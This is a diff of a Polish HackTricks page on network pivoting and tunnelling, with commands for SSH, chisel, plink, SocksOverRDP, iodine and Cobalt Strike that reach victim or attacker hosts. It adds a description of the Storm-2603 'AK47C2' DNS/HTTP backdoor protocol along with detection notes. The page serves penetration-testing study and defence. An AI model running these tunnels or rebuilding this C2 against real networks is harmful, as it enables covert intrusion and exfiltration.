@@ -2,10 +2,10 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Nmap tip
+## Wskazówka Nmap
 
 > [!WARNING]
-> **Skanowanie ICMP** i **SYN** nie może być tunelowane przez proxy socks, więc musimy **wyłączyć odkrywanie ping** (`-Pn`) i określić **skany TCP** (`-sT`), aby to działało.
+> **Skanowanie ICMP** i **SYN** nie może być tunelowane przez proxy socks, więc musimy **wyłączyć odkrywanie ping** (`-Pn`) i określić **skanowanie TCP** (`-sT`), aby to działało.
 
 ## **Bash**
 
@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-Musisz mieć **roota na obu urządzeniach** (ponieważ zamierzasz utworzyć nowe interfejsy) i konfiguracja sshd musi zezwalać na logowanie jako root:\
+Musisz mieć **root na obu urządzeniach** (ponieważ zamierzasz utworzyć nowe interfejsy) i konfiguracja sshd musi zezwalać na logowanie jako root:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -89,12 +89,12 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Bezpieczeństwo – Atak Terrapin (CVE-2023-48795)**
-> Atak degradacyjny Terrapin z 2023 roku może pozwolić atakującemu typu man-in-the-middle na manipulację wczesnym handshake'iem SSH i wstrzykiwanie danych do **dowolnego przekazywanego kanału** ( `-L`, `-R`, `-D` ). Upewnij się, że zarówno klient, jak i serwer są załatane (**OpenSSH ≥ 9.6/LibreSSH 6.7**) lub wyraźnie wyłącz podatne algorytmy `chacha20-poly1305@openssh.com` i `*-etm@openssh.com` w `sshd_config`/`ssh_config`, zanim polegasz na tunelach SSH.
+> Atak downgrade Terrapin z 2023 roku może pozwolić atakującemu typu man-in-the-middle na manipulację wczesnym handshake'iem SSH i wstrzykiwanie danych do **dowolnego przekazywanego kanału** ( `-L`, `-R`, `-D` ). Upewnij się, że zarówno klient, jak i serwer są załatane (**OpenSSH ≥ 9.6/LibreSSH 6.7**) lub wyraźnie wyłącz podatne algorytmy `chacha20-poly1305@openssh.com` i `*-etm@openssh.com` w `sshd_config`/`ssh_config` przed poleganiem na tunelach SSH.
 
 ## SSHUTTLE
 
 Możesz **tunelować** przez **ssh** cały **ruch** do **podsieci** przez hosta.\
-Na przykład, przekazywanie całego ruchu kierowanego do 10.10.10.0/24
+Na przykład, przekazywanie całego ruchu do 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -149,7 +149,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> W tym przypadku **port jest otwarty na hoście beacon**, a nie na serwerze zespołu, a ruch jest wysyłany do serwera zespołu, a stamtąd do wskazanego hosta:port
+> W tym przypadku **port jest otwarty na hoście beacon**, a nie na serwerze zespołu, a ruch jest wysyłany do serwera zespołu, a stamtąd do wskazanego host:port
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
@@ -163,7 +163,7 @@ Aby zauważyć:
 ### rPort2Port lokalnie
 
 > [!WARNING]
-> W tym przypadku **port jest otwierany w hoście beacona**, a nie w Serwerze Zespołu, a **ruch jest wysyłany do klienta Cobalt Strike** (a nie do Serwera Zespołu) i stamtąd do wskazanego hosta:port
+> W tym przypadku **port jest otwierany na hoście beacona**, a nie na Serwerze Zespołu, a **ruch jest wysyłany do klienta Cobalt Strike** (a nie do Serwera Zespołu) i stamtąd do wskazanego hosta:port
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -172,14 +172,14 @@ rportfwd_local stop [bind port]
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-Musisz przesłać plik webowy tunel: ashx|aspx|js|jsp|php|php|jsp
+Musisz przesłać plik tunelowy: ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
 ## Chisel
 
-Możesz go pobrać z strony wydań [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-Musisz użyć **tej samej wersji dla klienta i serwera**
+Możesz go pobrać ze strony wydań [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
+Musisz używać **tej samej wersji dla klienta i serwera**
 
 ### socks
 ```bash
@@ -231,7 +231,7 @@ listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
 # Display the currently running listeners on the agent -- Attacker
 listener_list
 ```
-### Uzyskiwanie dostępu do lokalnych portów agenta
+### Uzyskaj dostęp do lokalnych portów agenta
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
@@ -324,9 +324,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-To jak konsolowa wersja PuTTY (opcje są bardzo podobne do klienta ssh).
+To jak wersja konsolowa PuTTY (opcje są bardzo podobne do klienta ssh).
 
-Ponieważ ten plik binarny będzie uruchamiany na ofierze i jest klientem ssh, musimy otworzyć naszą usługę ssh i port, abyśmy mogli uzyskać połączenie zwrotne. Następnie, aby przekierować tylko lokalnie dostępny port na port w naszej maszynie:
+Ponieważ ten plik binarny będzie wykonywany na ofierze i jest klientem ssh, musimy otworzyć naszą usługę ssh i port, abyśmy mogli uzyskać połączenie zwrotne. Następnie, aby przekierować tylko lokalnie dostępny port na port w naszej maszynie:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -358,9 +358,9 @@ Na swoim komputerze klienckim załaduj **`SocksOverRDP-Plugin.dll`** w ten spos�
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Teraz możemy **połączyć** się z **ofiarą** za pomocą **RDP** używając **`mstsc.exe`**, i powinniśmy otrzymać **komunikat** informujący, że **wtyczka SocksOverRDP jest włączona**, i będzie **nasłuchiwać** na **127.0.0.1:1080**.
+Teraz możemy **połączyć** się z **ofiarą** za pomocą **RDP** używając **`mstsc.exe`**, i powinniśmy otrzymać **komunikat** informujący, że **plugin SocksOverRDP jest włączony**, i będzie **nasłuchiwać** na **127.0.0.1:1080**.
 
-**Połącz** się przez **RDP** i prześlij oraz uruchom na maszynie ofiary plik binarny `SocksOverRDP-Server.exe`:
+**Połącz** się przez **RDP** i prześlij oraz uruchom na maszynie ofiary binarny plik `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -368,13 +368,13 @@ Teraz potwierdź na swoim urządzeniu (atakującym), że port 1080 nasłuchuje:
 ```
 netstat -antb | findstr 1080
 ```
-Teraz możesz użyć [**Proxifier**](https://www.proxifier.com/) **do proxyzowania ruchu przez ten port.**
+Teraz możesz użyć [**Proxifier**](https://www.proxifier.com/) **do proxy'owania ruchu przez ten port.**
 
-## Proxyzowanie aplikacji GUI w Windows
+## Proxify aplikacje GUI Windows
 
-Możesz sprawić, że aplikacje GUI w Windows będą korzystać z proxy za pomocą [**Proxifier**](https://www.proxifier.com/).\
-W **Profile -> Proxy Servers** dodaj adres IP i port serwera SOCKS.\
-W **Profile -> Proxification Rules** dodaj nazwę programu do proxyzowania oraz połączenia do adresów IP, które chcesz proxyzować.
+Możesz sprawić, że aplikacje GUI Windows będą korzystać z proxy, używając [**Proxifier**](https://www.proxifier.com/).\
+W **Profile -> Proxy Servers** dodaj IP i port serwera SOCKS.\
+W **Profile -> Proxification Rules** dodaj nazwę programu do proxy'owania oraz połączenia do IP, które chcesz proxy'ować.
 
 ## Ominięcie proxy NTLM
 
@@ -387,7 +387,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Uwierzytelnia się w stosunku do proxy i wiąże lokalny port, który jest przekazywany do zewnętrznej usługi, którą określisz. Następnie możesz używać narzędzia według własnego wyboru przez ten port.\
+Uwierzytelnia się w stosunku do proxy i wiąże lokalny port, który jest przekazywany do zewnętrznej usługi, którą określisz. Następnie możesz używać wybranego narzędzia przez ten port.\
 Na przykład, aby przekazać port 443
 ```
 Username Alice
@@ -396,7 +396,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Teraz, jeśli na przykład ustawisz na ofierze usługę **SSH** do nasłuchiwania na porcie 443. Możesz się z nią połączyć przez port atakującego 2222.\
+Teraz, jeśli ustawisz na przykład w ofierze usługę **SSH** do nasłuchiwania na porcie 443. Możesz się z nią połączyć przez port atakującego 2222.\
 Możesz również użyć **meterpreter**, który łączy się z localhost:443, a atakujący nasłuchuje na porcie 2222.
 
 ## YARP
@@ -409,7 +409,7 @@ Odwrócony proxy stworzony przez Microsoft. Możesz go znaleźć tutaj: [https:/
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root jest potrzebny w obu systemach, aby utworzyć adaptery tunelowe i przesyłać dane między nimi za pomocą zapytań DNS.
+Root jest potrzebny w obu systemach, aby utworzyć adaptery tunelowe i tunelować dane między nimi za pomocą zapytań DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -446,11 +446,45 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Zmień DNS w proxychains
 
-Proxychains przechwytuje wywołanie `gethostbyname` w libc i tuneluje zapytania DNS tcp przez proxy socks. Domyślnie serwer DNS, który używa proxychains, to **4.2.2.2** (wpisany na stałe). Aby go zmienić, edytuj plik: _/usr/lib/proxychains3/proxyresolv_ i zmień adres IP. Jeśli jesteś w **środowisku Windows**, możesz ustawić adres IP **kontrolera domeny**.
+Proxychains przechwytuje wywołanie `gethostbyname` w libc i tuneluje zapytania DNS tcp przez proxy socks. Domyślnym serwerem DNS, który używa proxychains, jest 4.2.2.2 (wpisany na stałe). Aby go zmienić, edytuj plik: _/usr/lib/proxychains3/proxyresolv_ i zmień adres IP. Jeśli jesteś w środowisku Windows, możesz ustawić adres IP kontrolera domeny.
 
 ## Tunelowanie w Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
+
+### Niestandardowy DNS TXT / HTTP JSON C2 (AK47C2)
+
+Aktorka Storm-2603 stworzyła **dual-channel C2 ("AK47C2")**, który wykorzystuje *tylko* wychodzący **DNS** i **zwykły HTTP POST** – dwa protokoły, które rzadko są blokowane w sieciach korporacyjnych.
+
+1. **Tryb DNS (AK47DNS)**
+• Generuje losowy 5-znakowy SessionID (np. `H4T14`).
+• Dodaje `1` dla *żądań zadań* lub `2` dla *wyników* i konkatenacja różnych pól (flagi, SessionID, nazwa komputera).
+• Każde pole jest **szyfrowane XOR z kluczem ASCII `VHBD@H`**, kodowane w hex i łączone kropkami – kończąc na domenie kontrolowanej przez atakującego:
+
+```text
+<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
+```
+
+• Żądania używają `DnsQuery()` dla rekordów **TXT** (i zapasowych **MG**).
+• Gdy odpowiedź przekracza 0xFF bajtów, backdoor **fragmentuje** dane na kawałki po 63 bajty i wstawia znaczniki:
+`s<SessionID>t<TOTAL>p<POS>`, aby serwer C2 mógł je uporządkować.
+
+2. **Tryb HTTP (AK47HTTP)**
+• Buduje kopertę JSON:
+```json
+{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
+```
+• Cały blob jest XOR-`VHBD@H` → hex → wysyłany jako ciało **`POST /`** z nagłówkiem `Content-Type: text/plain`.
+• Odpowiedź podąża za tym samym kodowaniem, a pole `cmd` jest wykonywane z `cmd.exe /c <command> 2>&1`.
+
+Notatki Blue Team
+• Szukaj nietypowych **zapytaniach TXT**, których pierwszy etykieta jest długim heksadecymalnym i zawsze kończy się na jednej rzadkiej domenie.
+• Stały klucz XOR, po którym następuje ASCII-hex, jest łatwy do wykrycia za pomocą YARA: `6?56484244?484` (`VHBD@H` w hex).
+• Dla HTTP, oznaczaj ciała POST typu text/plain, które są czystym hexem i wielokrotnością dwóch bajtów.
+
+{{#note}}
+Cały kanał mieści się w **standardowych zapytaniach zgodnych z RFC** i utrzymuje każdą etykietę subdomeny poniżej 63 bajtów, co czyni go niewidocznym w większości logów DNS.
+{{#endnote}}
 
 ## Tunelowanie ICMP
 
@@ -459,7 +493,7 @@ Proxychains przechwytuje wywołanie `gethostbyname` w libc i tuneluje zapytania 
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Root jest potrzebny w obu systemach, aby utworzyć adaptery tunelowe i tunelować dane między nimi za pomocą żądań echo ICMP.
+Root jest potrzebny w obu systemach, aby stworzyć adaptery tunelowe i tunelować dane między nimi za pomocą żądań echo ICMP.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -561,7 +595,7 @@ cloudflared tunnel --url http://localhost:8080
 cloudflared tunnel --url socks5://localhost:1080 --socks5
 # Now configure proxychains to use 127.0.0.1:1080
 ```
-### Trwałe tunelowanie z DNS
+### Trwałe tunelowanie z użyciem DNS
 ```bash
 cloudflared tunnel create mytunnel
 cloudflared tunnel route dns mytunnel internal.example.com
@@ -599,7 +633,7 @@ localIP    = "127.0.0.1"
 localPort  = 3389
 remotePort = 5000
 ```
-### Używanie nowej bramy SSH (bez binarki frpc)
+### Używanie nowego bramy SSH (bez binarnego frpc)
 ```bash
 # On frps (attacker)
 sshTunnelGateway.bindPort = 2200   # add to frps.toml
@@ -660,7 +694,7 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 
 • Alarmuj na **nieoczekiwane binaria QEMU/VirtualBox/KVM** w ścieżkach zapisywalnych przez użytkownika.
 • Blokuj połączenia wychodzące, które pochodzą z `qemu-system*.exe`.
-• Szukaj rzadkich portów nasłuchujących (2222, 10022, …) wiążących się natychmiast po uruchomieniu QEMU.
+• Poluj na rzadkie porty nasłuchujące (2222, 10022, …) wiążące się natychmiast po uruchomieniu QEMU.
 
 ---
 
@@ -672,5 +706,6 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ## Odniesienia
 
 - [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
 
 {{#include ../banners/hacktricks-training.md}}
